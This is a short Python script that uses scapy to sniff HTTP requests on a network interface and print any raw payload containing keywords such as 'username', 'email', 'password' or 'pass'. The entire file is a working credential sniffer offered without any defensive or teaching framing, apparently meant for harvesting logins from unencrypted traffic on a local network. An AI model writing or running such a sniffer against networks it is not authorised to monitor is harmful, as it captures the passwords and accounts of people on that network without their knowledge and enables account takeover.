import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) # filer="port 21"

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "email", "uname", "password", "pass", "upass"]
            for keyword in keywords:
                if keyword in load.decode():
                    print(load)
                    break
    

sniff("Ethernet")
